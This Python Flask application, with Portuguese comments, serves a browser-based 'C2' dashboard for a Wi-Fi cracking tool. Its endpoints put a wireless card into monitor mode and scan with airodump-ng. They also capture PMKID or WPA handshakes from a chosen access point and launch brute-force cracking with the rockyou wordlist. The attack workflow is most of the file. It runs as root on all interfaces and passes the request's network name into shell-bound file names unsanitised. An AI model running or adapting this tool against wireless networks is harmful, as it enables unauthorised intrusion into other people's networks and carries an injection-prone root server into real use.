import os
import time
import csv
import subprocess
import threading
from flask import Flask, render_template, request, jsonify

# Importa as funções principais do nosso script anterior (core da ferramenta)
from wifi_auditor import run_command, set_monitor_mode, set_managed_mode, capture_pmkid, capture_handshake, crack_hash

app = Flask(__name__)

# Variáveis globais de controle de estado
CURRENT_MONITOR_IFACE = None
SCAN_PROCESS = None
CSV_PREFIX = "web_scan_results"

@app.route('/')
def dashboard():
    """ Renderiza o Front-End Cyberpunk """
    return render_template('index.html')

@app.route('/api/interfaces', methods=['GET'])
def get_interfaces():
    stdout, stderr = run_command("iw dev | awk '$1==\"Interface\"{print $2}'")
    interfaces = stdout.split('\n') if stdout else []
    return jsonify({
        "status": "success",
        "interfaces": [i for i in interfaces if i],
        "os_type": "linux"
    })

@app.route('/api/start_monitor', methods=['POST'])
def start_monitor():
    global CURRENT_MONITOR_IFACE
    data = request.get_json()
    iface = data.get('interface')
    
    if not iface:
        return jsonify({"status": "error", "message": "Nenhuma interface providenciada"}), 400
        
    CURRENT_MONITOR_IFACE = set_monitor_mode(iface)
    
    if CURRENT_MONITOR_IFACE:
        return jsonify({"status": "success", "monitor_interface": CURRENT_MONITOR_IFACE})
    else:
        return jsonify({"status": "error", "message": "Falha ao armar o modo monitor (veja logs no terminal)"}), 500

@app.route('/api/start_scan', methods=['POST'])
def start_scan():
    global SCAN_PROCESS, CURRENT_MONITOR_IFACE
    if not CURRENT_MONITOR_IFACE:
        return jsonify({"status": "error", "message": "Modo monitor não está ativo."}), 400
        
    # Limpa arquivos antigos
    run_command(f"rm -f {CSV_PREFIX}-01.*")
    
    # Roda o airodump silenciosamente no fundo para alimentar o CSV
    # --update 1 força o airodump a escrever no arquivo mais rápido
    cmd = f"airodump-ng --output-format csv -w {CSV_PREFIX} --update 1 {CURRENT_MONITOR_IFACE}"
    SCAN_PROCESS = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    return jsonify({"status": "success", "message": "Radar ligado com sucesso."})

@app.route('/api/stop_scan', methods=['POST'])
def stop_scan():
    global SCAN_PROCESS
    if SCAN_PROCESS:
        SCAN_PROCESS.terminate()
        run_command("killall airodump-ng", sudo=True)
        SCAN_PROCESS = None
    return jsonify({"status": "success", "message": "Radar desligado."})

@app.route('/api/get_networks', methods=['GET'])
def get_networks():
    csv_file = f"{CSV_PREFIX}-01.csv"
    networks = []
    
    if os.path.exists(csv_file):
        try:
            with open(csv_file, 'r', encoding='utf-8', errors='ignore') as f:
                reader = csv.reader(f)
                in_ap_section = False
                for row in reader:
                    if not row or len(row) < 14: continue
                    if row[0].strip() == "BSSID":
                        in_ap_section = True
                        continue
                    if row[0].strip() == "Station MAC": break
                    
                    if in_ap_section:
                        bssid = row[0].strip()
                        pwr = row[8].strip() # Signal PWR in CSV is column 9 (index 8)
                        channel = row[3].strip()
                        privacy = row[5].strip()
                        essid = row[13].strip()
                        if essid and essid != "\x00":
                            networks.append({
                                'bssid': bssid, 
                                'signal': pwr,
                                'channel': channel, 
                                'privacy': privacy, 
                                'essid': essid
                            })
        except Exception:
            pass
            
    # Ordena pelo sinal mais forte (menor número negativo)
    networks.sort(key=lambda x: int(x['signal']) if x['signal'].lstrip('-').isdigit() else -100, reverse=True)
    return jsonify({"status": "success", "networks": networks})

@app.route('/api/attack', methods=['POST'])
def launch_attack():
    global CURRENT_MONITOR_IFACE
    if not CURRENT_MONITOR_IFACE:
        return jsonify({"status": "error", "message": "Nenhuma interface armada."})

    data = request.get_json()
    bssid = data.get('bssid')
    channel = data.get('channel')
    essid = data.get('essid')
    attack_type = data.get('attack_type')
    
    prefix = f"web_capture_{essid.replace(' ', '_')}"
    
    # ATENÇÃO: Essa função trava a thread do Flask enquanto ataca (30-60 segundos).
    # Como é um painel C2 local monousuário, isso não é um problema.
    cap_file = None
    if attack_type == 'pmkid':
        cap_file = capture_pmkid(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
        if not cap_file: # Fallback automátic PhD mode
             cap_file = capture_handshake(CURRENT_MONITOR_IFACE, bssid, channel, prefix)
    else:
        cap_file = capture_handshake(CURRENT_MONITOR_IFACE, bssid, channel, prefix)

    if cap_file:
        # Se capturou, tenta iniciar a força bruta em uma thread paralela
        # A wordlist rockyou é muito comum no Kali:
        wordlist = "/usr/share/wordlists/rockyou.txt"
        if os.path.exists(wordlist):
            threading.Thread(target=crack_hash, args=(cap_file, wordlist, bssid)).start()
            return jsonify({"status": "success", "message": "Handshake Retido. Cracking (Força Bruta) rolando no terminal backend.", "cap_file": cap_file})
        else:
            return jsonify({"status": "success", "message": f"Handshake salvo em {cap_file}. Wordlist padrão (rockyou) não encontrada para cracking automático.", "cap_file": cap_file})
            
    return jsonify({"status": "error", "message": "O Roteador alvo bloqueou o ataque ou não há clientes conectados."})

@app.route('/api/restore', methods=['POST'])
def restore():
    global CURRENT_MONITOR_IFACE, SCAN_PROCESS
    if SCAN_PROCESS:
        SCAN_PROCESS.terminate()
        run_command("killall airodump-ng", sudo=True)
        SCAN_PROCESS = None
        
    if CURRENT_MONITOR_IFACE:
        set_managed_mode(CURRENT_MONITOR_IFACE)
        CURRENT_MONITOR_IFACE = None
        return jsonify({"status": "success", "message": "Placa de rede civil restabelecida."})
    
    return jsonify({"status": "success", "message": "Nada a restaurar."})

if __name__ == '__main__':
    # Verifica se Flask tá rodando como root
    if os.geteuid() != 0:
        print("[!] ATENÇÃO: Para o C2 controlar as placas Wi-Fi, o Flask DEVE ser executado como root.")
        print("Digite: sudo python3 web_auditor.py")
        exit(1)
        
    print("\n" + "="*50)
    print(" >>> C2 SERVER ONLINE (PORTA 5000) <<< ")
    print(" 1. Abra seu navegador web.")
    print(" 2. Acesse a URL secreta: http://localhost:5000")
    print("="*50 + "\n")
    
    # Roda o servidor Flask em modo debug leve (threaded)
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
